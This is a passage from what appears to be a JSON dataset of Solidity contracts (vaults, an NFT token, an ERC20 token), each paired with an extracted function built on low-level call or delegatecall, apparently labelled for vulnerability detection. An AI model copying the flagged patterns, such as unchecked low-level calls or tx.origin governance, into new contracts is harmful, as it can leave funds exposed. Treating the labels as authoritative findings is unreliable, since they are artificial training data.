commitments[_hashkey].lockable = _lockable;\n }\n function setParams1(bytes32 _hashkey, uint256 _params1) external onlyShakerAndDisputManager {\n commitments[_hashkey].params1 = _params1;\n }\n function setParams2(bytes32 _hashkey, uint256 _params2) external onlyShakerAndDisputManager {\n commitments[_hashkey].params2 = _params2;\n }\n function setParams3(bytes32 _hashkey, uint256 _params3) external onlyShakerAndDisputManager {\n commitments[_hashkey].params3 = _params3;\n }\n function setParams4(bytes32 _hashkey, address _params4) external onlyShakerAndDisputManager {\n commitments[_hashkey].params4 = _params4;\n }\n function getStatus(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].status;\n }\n function getAmount(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].amount;\n }\n function getSender(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(address payable) {\n return commitments[_hashkey].sender;\n }\n function getEffectiveTime(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].effectiveTime;\n }\n function getTimestamp(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].timestamp;\n }\n function getCanEndorse(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].canEndorse;\n }\n function getLockable(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].lockable;\n }\n function getParams1(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].params1;\n }\n function getParams2(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].params2;\n }\n function getParams3(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(uint256) {\n return commitments[_hashkey].params3;\n }\n function getParams4(bytes32 _hashkey) external view onlyShakerAndDisputManager returns(address) {\n return commitments[_hashkey].params4;\n }\n function updateOperator(address _operator) external onlyOperator {\n operator = _operator;\n }\n function updateShakerAddress(address _shaker, uint256 _allowance) external onlyOperator returns(bool) {\n shakerContractAddress = _shaker;\n safeApprove(erc20Address, _shaker, _allowance);\n return true;\n }\n function updateDisputeManager(address _disputeManagerAddress, uint256 _allowance) external onlyOperator returns(bool) {\n disputeManagerAddress = _disputeManagerAddress;\n safeApprove(erc20Address, _disputeManagerAddress, _allowance);\n return true;\n }\n function getShakerAllowance() external view returns(uint256) {\n return erc20.allowance(address(this), shakerContractAddress);\n }\n function getDisputeManagerAllowance() external view returns(uint256) {\n return erc20.allowance(address(this), disputeManagerAddress);\n }\n function addTotalAmount(uint256 _amount) external onlyShakerAndDisputManager {\n totalAmount = totalAmount.add(_amount);\n }\n function addTotalBalance(uint256 _amount) external onlyShakerAndDisputManager {\n totalBalance = totalBalance.add(_amount);\n }\n function subTotalBalance(uint256 _amount) external onlyShakerAndDisputManager {\n totalBalance = totalBalance.sub(_amount);\n }\n function safeApprove(address token, address to, uint value) internal {\n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n }\n}",
  "extract_feature": [
    "function safeApprove(address token, address to, uint value) internal {\n(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\nrequire(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165d"
  },
  "filename": "44526.sol",
  "content": "pragma solidity ^0.8.1;\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n function _msgData() internal view virtual returns (bytes calldata) {\n this;\n return msg.data;\n }\n}\nlibrary Address {\n function isContract(address account) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(account) }\n return size > 0;\n }\n function sendValue(address payable recipient, uint256 amount) internal {\n require(address(this).balance >= amount, \"Address: insufficient balance\");\n (bool success, ) = recipient.call{ value: amount }(\"\");\n require(success, \"Address: unable to send value, recipient may have reverted\");\n }\n function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n return functionCall(target, data, \"Address: low-level call failed\");\n }\n function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n return functionCallWithValue(target, data, 0, errorMessage);\n }\n function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n }\n function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n require(address(this).balance >= value, \"Address: insufficient balance for call\");\n require(isContract(target), \"Address: call to non-contract\");\n (bool success, bytes memory returndata) = target.call{ value: value }(data);\n return _verifyCallResult(success, returndata, errorMessage);\n }\n function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n return functionStaticCall(target, data, \"Address: low-level static call failed\");\n }\n function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\n require(isContract(target), \"Address: static call to non-contract\");\n (bool success, bytes memory returndata) = target.staticcall(data);\n return _verifyCallResult(success, returndata, errorMessage);\n }\n function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n }\n function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n require(isContract(target), \"Address: delegate call to non-contract\");\n (bool success, bytes memory returndata) = target.delegatecall(data);\n return _verifyCallResult(success, returndata, errorMessage);\n }\n function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\n if (success) {\n return returndata;\n } else {\n if (returndata.length > 0) {\n assembly {\n let returndata_size := mload(returndata)\n revert(add(32, returndata), returndata_size)\n }\n } else {\n revert(errorMessage);\n }\n }\n }\n}\nlibrary Strings {\n bytes16 private constant alphabet = \"0123456789abcdef\";\n function toString(uint256 value) internal pure returns (string memory) {\n if (value == 0) {\n return \"0\";\n }\n uint256 temp = value;\n uint256 digits;\n while (temp != 0) {\n digits++;\n temp /= 10;\n }\n bytes memory buffer = new bytes(digits);\n while (value != 0) {\n digits -= 1;\n buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n value /= 10;\n }\n return string(buffer);\n }\n function toHexString(uint256 value) internal pure returns (string memory) {\n if (value == 0) {\n return \"0x00\";\n }\n uint256 temp = value;\n uint256 length = 0;\n while (temp != 0) {\n length++;\n temp >>= 8;\n }\n return toHexString(value, length);\n }\n function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n bytes memory buffer = new bytes(2 * length + 2);\n buffer[0] = \"0\";\n buffer[1] = \"x\";\n for (uint256 i = 2 * length + 1; i > 1; --i) {\n buffer[i] = alphabet[value & 0xf];\n value >>= 4;\n }\n require(value == 0, \"Strings: hex length insufficient\");\n return string(buffer);\n }\n}\nabstract contract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n function owner() public view virtual returns (address) {\n return _owner;\n }\n modifier onlyOwner() {\n require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n _;\n }\n function renounceOwnership() public virtual onlyOwner {\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n function transferOwnership(address newOwner) public virtual onlyOwner {\n require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n emit OwnershipTransferred(_owner, newOwner);\n _owner = newOwner;\n }\n}\ninterface IERC165 {\n function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\ninterface IERC721 is IERC165 {\n event Transfer(address indexed from, address indexed to, uint256 indexed tokenID);\n event Approval(address indexed owner, address indexed approved, uint256 indexed tokenID);\n event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n function balanceOf(address owner) external view returns (uint256 balance);\n function ownerOf(uint256 tokenID) external view returns (address owner);\n function safeTransferFrom(address from, address to, uint256 tokenID) external;\n function transferFrom(address from, address to, uint256 tokenID) external;\n function approve(address to, uint256 tokenID) external;\n function getApproved(uint256 tokenID) external view returns (address operator);\n function setApprovalForAll(address operator, bool _approved) external;\n function isApprovedForAll(address owner, address operator) external view returns (bool);\n function safeTransferFrom(address from, address to, uint256 tokenID, bytes calldata data) external;\n}\nabstract contract ERC165 is IERC165 {\n function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n return interfaceId == type(IERC165).interfaceId;\n }\n}\ninterface IERC721Metadata is IERC721 {\n function name() external view returns (string memory);\n function symbol() external view returns (string memory);\n function tokenURI(uint256 tokenID) external view returns (string memory);\n}\ninterface IERC721Receiver {\n function onERC721Received(address operator, address from, uint256 tokenID, bytes calldata data) external returns (bytes4);\n}\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\n using Address for address;\n using Strings for uint256;\n string private _name;\n string private _symbol;\n mapping (uint256 => address) private _owners;\n mapping (address => uint256) private _balances;\n mapping (uint256 => address) private _tokenApprovals;\n mapping (address => mapping (address => bool)) private _operatorApprovals;\n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n }\n function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n return interfaceId == type(IERC721).interfaceId\n || interfaceId == type(IERC721Metadata).interfaceId\n || super.supportsInterface(interfaceId);\n }\n function balanceOf(address owner) public view virtual override returns (uint256) {\n require(owner != address(0), \"ERC721: balance query for the zero address\");\n return _balances[owner];\n }\n function ownerOf(uint256 tokenID) public view virtual override returns (address) {\n address owner = _owners[tokenID];\n require(owner != address(0), \"ERC721: owner query for nonexistent token\");\n return owner;\n }\n function name() public view virtual override returns (string memory) {\n return _name;\n }\n function symbol() public view virtual override returns (string memory) {\n return _symbol;\n }\n function tokenURI(uint256 tokenID) public view virtual override returns (string memory) {\n require(_exists(tokenID), \"ERC721Metadata: URI query for nonexistent token\");\n string memory baseURI = _baseURI();\n return bytes(baseURI).length > 0\n ? string(abi.encodePacked(baseURI, tokenID.toString()))\n : '';\n }\n function _baseURI() internal view virtual returns (string memory) {\n return \"\";\n }\n function approve(address to, uint256 tokenID) public virtual override {\n address owner = ERC721.ownerOf(tokenID);\n require(to != owner, \"ERC721: approval to current owner\");\n require(_msgSender() == owner || ERC721.isApprovedForAll(owner, _msgSender()),\n \"ERC721: approve caller is not owner nor approved for all\"\n );\n _approve(to, tokenID);\n }\n function getApproved(uint256 tokenID) public view virtual override returns (address) {\n require(_exists(tokenID), \"ERC721: approved query for nonexistent token\");\n return _tokenApprovals[tokenID];\n }\n function setApprovalForAll(address operator, bool approved) public virtual override {\n require(operator != _msgSender(), \"ERC721: approve to caller\");\n _operatorApprovals[_msgSender()][operator] = approved;\n emit ApprovalForAll(_msgSender(), operator, approved);\n }\n function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\n return _operatorApprovals[owner][operator];\n }\n function transferFrom(address from, address to, uint256 tokenID) public virtual override {\n require(_isApprovedOrOwner(_msgSender(), tokenID), \"ERC721: transfer caller is not owner nor approved\");\n _transfer(from, to, tokenID);\n }\n function safeTransferFrom(address from, address to, uint256 tokenID) public virtual override {\n safeTransferFrom(from, to, tokenID, \"\");\n }\n function safeTransferFrom(address from, address to, uint256 tokenID, bytes memory _data) public virtual override {\n require(_isApprovedOrOwner(_msgSender(), tokenID), \"ERC721: transfer caller is not owner nor approved\");\n _safeTransfer(from, to, tokenID, _data);\n }\n function _safeTransfer(address from, address to, uint256 tokenID, bytes memory _data) internal virtual {\n _transfer(from, to, tokenID);\n require(_checkOnERC721Received(from, to, tokenID, _data), \"ERC721: transfer to non ERC721Receiver implementer\");\n }\n function _exists(uint256 tokenID) internal view virtual returns (bool) {\n return _owners[tokenID] != address(0);\n }\n function _isApprovedOrOwner(address spender, uint256 tokenID) internal view virtual returns (bool) {\n require(_exists(tokenID), \"ERC721: operator query for nonexistent token\");\n address owner = ERC721.ownerOf(tokenID);\n return (spender == owner || getApproved(tokenID) == spender || ERC721.isApprovedForAll(owner, spender));\n }\n function _safeMint(address to, uint256 tokenID) internal virtual {\n _safeMint(to, tokenID, \"\");\n }\n function _safeMint(address to, uint256 tokenID, bytes memory _data) internal virtual {\n _mint(to, tokenID);\n require(_checkOnERC721Received(address(0), to, tokenID, _data), \"ERC721: transfer to non ERC721Receiver implementer\");\n }\n function _mint(address to, uint256 tokenID) internal virtual {\n require(to != address(0), \"ERC721: mint to the zero address\");\n require(!_exists(tokenID), \"ERC721: token already minted\");\n _beforeTokenTransfer(address(0), to, tokenID);\n _balances[to] += 1;\n _owners[tokenID] = to;\n emit Transfer(address(0), to, tokenID);\n }\n function _burn(uint256 tokenID) internal virtual {\n address owner = ERC721.ownerOf(tokenID);\n _beforeTokenTransfer(owner, address(0), tokenID);\n _approve(address(0), tokenID);\n _balances[owner] -= 1;\n delete _owners[tokenID];\n emit Transfer(owner, address(0), tokenID);\n }\n function _transfer(address from, address to, uint256 tokenID) internal virtual {\n require(ERC721.ownerOf(tokenID) == from, \"ERC721: transfer of token that is not own\");\n require(to != address(0), \"ERC721: transfer to the zero address\");\n _beforeTokenTransfer(from, to, tokenID);\n _approve(address(0), tokenID);\n _balances[from] -= 1;\n _balances[to] += 1;\n _owners[tokenID] = to;\n emit Transfer(from, to, tokenID);\n }\n function _approve(address to, uint256 tokenID) internal virtual {\n _tokenApprovals[tokenID] = to;\n emit Approval(ERC721.ownerOf(tokenID), to, tokenID);\n }\n function _checkOnERC721Received(address from, address to, uint256 tokenID, bytes memory _data)\n private returns (bool)\n {\n if (to.isContract()) {\n try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenID, _data) returns (bytes4 retval) {\n return retval == IERC721Receiver(to).onERC721Received.selector;\n } catch (bytes memory reason) {\n if (reason.length == 0) {\n revert(\"ERC721: transfer to non ERC721Receiver implementer\");\n } else {\n assembly {\n revert(add(32, reason), mload(reason))\n }\n }\n }\n } else {\n return true;\n }\n }\n function _beforeTokenTransfer(address from, address to, uint256 tokenID) internal virtual { }\n}\nabstract contract AccessControl is Context {\n struct RoleData {\n mapping (address => bool) members;\n bytes32 adminRole;\n }\n mapping (bytes32 => RoleData) private _roles;\n bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;\n event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);\n event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n function hasRole(bytes32 role, address account) public view returns (bool) {\n return _roles[role].members[account];\n }\n function getRoleAdmin(bytes32 role) public view returns (bytes32) {\n return _roles[role].adminRole;\n }\n function grantRole(bytes32 role, address account) public virtual {\n require(hasRole(getRoleAdmin(role), _msgSender()), \"AccessControl: sender must be an admin to grant\");\n _grantRole(role, account);\n }\n function revokeRole(bytes32 role, address account) public virtual {\n require(hasRole(getRoleAdmin(role), _msgSender()), \"AccessControl: sender must be an admin to revoke\");\n _revokeRole(role, account);\n }\n function renounceRole(bytes32 role, address account) public virtual {\n require(account == _msgSender(), \"AccessControl: can only renounce roles for self\");\n _revokeRole(role, account);\n }\n function _setupRole(bytes32 role, address account) internal virtual {\n _grantRole(role, account);\n }\n function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {\n emit RoleAdminChanged(role, getRoleAdmin(role), adminRole);\n _roles[role].adminRole = adminRole;\n }\n function _grantRole(bytes32 role, address account) private {\n if (!hasRole(role, account)) {\n _roles[role].members[account] = true;\n emit RoleGranted(role, account, _msgSender());\n }\n }\n function _revokeRole(bytes32 role, address account) private {\n if (hasRole(role, account)) {\n _roles[role].members[account] = false;\n emit RoleRevoked(role, account, _msgSender());\n }\n }\n}\ncontract MinterAccess is Ownable, AccessControl {\n bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n modifier onlyMinter {\n require(hasRole(MINTER_ROLE, _msgSender()), \"MinterAccess: Sender is not a minter\");\n _;\n }\n constructor() {\n _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n _setupRole(MINTER_ROLE, msg.sender);\n }\n function addMinter(address account) external {\n grantRole(MINTER_ROLE, account);\n }\n function renounceMinter(address account) external {\n renounceRole(MINTER_ROLE, account);\n }\n function revokeMinter(address account) external {\n revokeRole(MINTER_ROLE, account);\n }\n}\ncontract DMarketNFTToken is MinterAccess, ERC721 {\n string private _baseTokenURI;\n constructor (address newOwner, string memory tokenURIPrefix) ERC721(\"DMarket NFT Swap\", \"DM NFT\") {\n transferOwnership(newOwner);\n grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n _baseTokenURI = tokenURIPrefix;\n }\n function _baseURI() internal view virtual override returns (string memory) {\n return _baseTokenURI;\n }\n function burn(uint256 tokenID) public virtual {\n require(_isApprovedOrOwner(_msgSender(), tokenID), \"DMarketNFTToken: caller is not owner nor approved\");\n _burn(tokenID);\n }\n function mintToken(address to, uint64 tokenID) public virtual onlyMinter {\n _mint(to, tokenID);\n }\n function mintTokenBatch(address[] memory receivers, uint64[] memory tokenIDs) public virtual onlyMinter {\n require(receivers.length > 0,\"DMarketNFTToken: must be some receivers\");\n require(receivers.length == tokenIDs.length, \"DMarketNFTToken: must be the same number of receivers/tokenIDs\");\n for (uint64 i = 0; i < receivers.length; i++) {\n address to = receivers[i];\n uint256 tokenID = tokenIDs[i];\n _mint(to, tokenID);\n }\n }\n}",
  "extract_feature": [
    "function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\nrequire(isContract(target), \"Address: delegate call to non-contract\");\n(bool success, bytes memory returndata) = target.delegatecall(data);\nreturn _verifyCallResult(success, returndata, errorMessage);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165e"
  },
  "filename": "44546.sol",
  "content": "pragma solidity 0.5.16;\ninterface IERC20 {\n function totalSupply() external view returns (uint);\n function balanceOf(address account) external view returns (uint);\n function transfer(address recipient, uint amount) external returns (bool);\n function allowance(address owner, address spender) external view returns (uint);\n function approve(address spender, uint amount) external returns (bool);\n function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract Context {\n constructor () internal { }\n function _msgSender() internal view returns (address payable) {\n return msg.sender;\n }\n}\ncontract ERC20 is Context, IERC20 {\n using SafeMath for uint;\n mapping (address => uint) private _balances;\n mapping (address => mapping (address => uint)) private _allowances;\n uint private _totalSupply;\n function totalSupply() public view returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address account) public view returns (uint) {\n return _balances[account];\n }\n function transfer(address recipient, uint amount) public returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n function allowance(address owner, address spender) public view returns (uint) {\n return _allowances[owner][spender];\n }\n function approve(address spender, uint amount) public returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\n _transfer(sender, recipient, amount);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n return true;\n }\n function increaseAllowance(address spender, uint addedValue) public returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n return true;\n }\n function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n return true;\n }\n function _transfer(address sender, address recipient, uint amount) internal {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n _beforeTokenTransfer(sender, recipient, amount);\n _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n _balances[recipient] = _balances[recipient].add(amount);\n emit Transfer(sender, recipient, amount);\n }\n function _mint(address account, uint amount) internal {\n require(account != address(0), \"ERC20: mint to the zero address\");\n _beforeTokenTransfer(address(0), account, amount);\n _totalSupply = _totalSupply.add(amount);\n _balances[account] = _balances[account].add(amount);\n emit Transfer(address(0), account, amount);\n }\n function _burn(address account, uint amount) internal {\n require(account != address(0), \"ERC20: burn from the zero address\");\n _beforeTokenTransfer(account, address(0), amount);\n _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n _totalSupply = _totalSupply.sub(amount);\n emit Transfer(account, address(0), amount);\n }\n function _approve(address owner, address spender, uint amount) internal {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal { }\n}\ncontract ERC20Detailed is IERC20 {\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n uint256 private _cap;\n constructor (string memory name, string memory symbol, uint8 decimals, uint256 cap) public {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _cap = cap;\n }\n function name() public view returns (string memory) {\n return _name;\n }\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n function cap() public view returns (uint256) {\n return _cap;\n }\n}\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n require(b <= a, errorMessage);\n uint c = a - b;\n return c;\n }\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n require(b > 0, errorMessage);\n uint c = a / b;\n return c;\n }\n}\nlibrary Address {\n function isContract(address account) internal view returns (bool) {\n bytes32 codehash;\n bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n assembly { codehash := extcodehash(account) }\n return (codehash != 0x0 && codehash != accountHash);\n }\n}\nlibrary SafeERC20 {\n using SafeMath for uint;\n using Address for address;\n function safeTransfer(IERC20 token, address to, uint value) internal {\n callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n }\n function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n }\n function safeApprove(IERC20 token, address spender, uint value) internal {\n require((value == 0) || (token.allowance(address(this), spender) == 0),\n \"SafeERC20: approve from non-zero to non-zero allowance\"\n );\n callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n }\n function callOptionalReturn(IERC20 token, bytes memory data) private {\n require(address(token).isContract(), \"SafeERC20: call to non-contract\");\n (bool success, bytes memory returndata) = address(token).call(data);\n require(success, \"SafeERC20: low-level call failed\");\n if (returndata.length > 0) {\n require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n }\n }\n}\ncontract HD is ERC20, ERC20Detailed {\n using SafeERC20 for IERC20;\n using Address for address;\n using SafeMath for uint;\n address public governance;\n address public pendingGov;\n mapping (address => bool) public minters;\n event NewPendingGov(address oldPendingGov, address newPendingGov);\n event NewGov(address oldGov, address newGov);\n modifier onlyGov() {\n require(msg.sender == governance, \"HUB-Token: !governance\");\n _;\n }\n constructor () public ERC20Detailed(\"HUB.finance\", \"HD\", 18, 21000000 * 10 ** 18) {\n governance = tx.origin;\n }\n function mint(address _account, uint256 _amount) public {\n require(minters[msg.sender], \"HUB-Token: !minter\");\n _mint(_account, _amount);\n }\n function addMinter(address _minter) public onlyGov {\n minters[_minter] = true;\n }\n function removeMinter(address _minter) public onlyGov {\n minters[_minter] = false;\n }\n function setPendingGov(address _pendingGov)\n external\n onlyGov\n {\n address oldPendingGov = pendingGov;\n pendingGov = _pendingGov;\n emit NewPendingGov(oldPendingGov, _pendingGov);\n }\n function acceptGov()\n external {\n require(msg.sender == pendingGov, \"HUB-Token: !pending\");\n address oldGov = governance;\n governance = pendingGov;\n pendingGov = address(0);\n emit NewGov(oldGov, governance);\n }\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal {\n super._beforeTokenTransfer(from, to, amount);\n if (from == address(0)) {\n require(totalSupply().add(amount) <= cap(), \"HUB-Token: Cap exceeded\");\n }\n }\n}",
  "extract_feature": [
    "function callOptionalReturn(IERC20 token, bytes memory data) private {\nrequire(address(token).isContract(), \"SafeERC20: call to non-contract\");\n(bool success, bytes memory returndata) = address(token).call(data);\nrequire(success, \"SafeERC20: low-level call failed\");\nif (returndata.length > 0) {\nrequire(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb165f"
  },
  "filename": "44652.sol",
  "content": "pragma solidity >=0.4.23 <0.6.0;\nimport \"./interfaces/ERC20Interface.sol\";\nimport \"./Mocks/SafeMath.sol\";\ncontract RedpacketVaultV2 {\n using SafeMath for uint256;\n ERC20Interface private erc20;\n address public erc20Address;\n uint256 public totalAmount = 0;\n uint256 public totalBalance = 0;\n struct Commitment {\n uint256 status;\n uint256 amount;\n address payable sender;\n uint256 timestamp;\n string memo;\n address[] takenAddresses;\n uint256 withdrawTimes;\n uint256 cliff;\n }\n mapping(bytes32 => Commitment) private commitments;\n mapping(address => bytes32[]) private hashKeys;\n address public operator;\n address public redpacketManagerAddress;\n modifier onlyOperator {\n require(msg.sender == operator, \"Only operator can call this function.\");\n _;\n }\n modifier onlyRedpacketManager {\n require(msg.sender == redpacketManagerAddress, \"Only redpacket manager contract can call this function.\");\n _;\n }\n constructor(address _erc20Address) public {\n operator = msg.sender;\n erc20Address = _erc20Address;\n erc20 = ERC20Interface(erc20Address);\n }\n function setStatus(bytes32 _hashkey, uint256 _status) external onlyRedpacketManager {\n commitments[_hashkey].status = _status;\n }\n function setAmount(bytes32 _hashkey, uint256 _amount) external onlyRedpacketManager {\n commitments[_hashkey].amount = _amount;\n }\n function setSender(bytes32 _hashkey, address payable _sender) external onlyRedpacketManager {\n commitments[_hashkey].sender = _sender;\n if(hashKeys[_sender].length == 0) hashKeys[_sender] = new bytes32[](0);\n hashKeys[_sender].push(_hashkey);\n }\n function setTimestamp(bytes32 _hashkey, uint256 _timestamp) external onlyRedpacketManager {\n commitments[_hashkey].timestamp = _timestamp;\n }\n function setMemo(bytes32 _hashkey, string calldata _memo) external onlyRedpacketManager {\n commitments[_hashkey].memo = _memo;\n }\n function setWithdrawTimes(bytes32 _hashkey, uint256 _times) external onlyRedpacketManager {\n commitments[_hashkey].withdrawTimes = _times;\n }\n function setCliff(bytes32 _hashkey, uint256 _cliff) external onlyRedpacketManager {\n commitments[_hashkey].cliff = _cliff;\n }\n function initTakenAddresses(bytes32 _hashkey) external onlyRedpacketManager {\n commitments[_hashkey].takenAddresses = new address[](0);\n }\n function isTaken(bytes32 _hashkey, address _address) external view returns(bool) {\n bool has = false;\n for(uint256 i = 0; i < commitments[_hashkey].takenAddresses.length; i++) {\n if(_address == commitments[_hashkey].takenAddresses[i]) {has = true; break;}\n }\n return has;\n }\n function addTakenAddress(bytes32 _hashkey, address _address) external onlyRedpacketManager {\n commitments[_hashkey].takenAddresses.push(_address);\n }\n function getHashkeysBySender() external view returns(bytes32[] memory) {\n bytes32[] memory hashkeys = new bytes32[](hashKeys[msg.sender].length);\n for(uint256 i = 0; i < hashKeys[msg.sender].length; i++) {\n if(this.getAmount(hashKeys[msg.sender][i]) == 0) continue;\n hashkeys[i] = hashKeys[msg.sender][i];\n }\n return hashkeys;\n }\n function getStatus(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].status;\n }\n function getAmount(bytes32 _hashkey) external view returns(uint256) {\n return commitments[_hashkey].amount;\n }\n function getSender(bytes32 _hashkey) external view onlyRedpacketManager returns(address payable) {\n return commitments[_hashkey].sender;\n }\n function getTimestamp(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].timestamp;\n }\n function getMemo(bytes32 _hashkey) external view onlyRedpacketManager returns(string memory) {\n return commitments[_hashkey].memo;\n }\n function getWithdrawTimes(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].withdrawTimes;\n }\n function getCliff(bytes32 _hashkey) external view onlyRedpacketManager returns(uint256) {\n return commitments[_hashkey].cliff;\n }\n function updateOperator(address _operator) external onlyOperator {\n operator = _operator;\n }\n function updateRedpacketManagerAddress(address _redpacketManager, uint256 _allowance) external onlyOperator returns(bool) {\n redpacketManagerAddress = _redpacketManager;\n safeApprove(erc20Address, _redpacketManager, _allowance);\n return true;\n }\n function getRedpacketAllowance() external view returns(uint256) {\n return erc20.allowance(address(this), redpacketManagerAddress);\n }\n function addTotalAmount(uint256 _amount) external onlyRedpacketManager {\n totalAmount = totalAmount.add(_amount);\n }\n function addTotalBalance(uint256 _amount) external onlyRedpacketManager {\n totalBalance = totalBalance.add(_amount);\n }\n function subTotalBalance(uint256 _amount) external onlyRedpacketManager {\n totalBalance = totalBalance.sub(_amount);\n }\n function safeApprove(address token, address to, uint value) internal {\n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n }\n}",
  "extract_feature": [
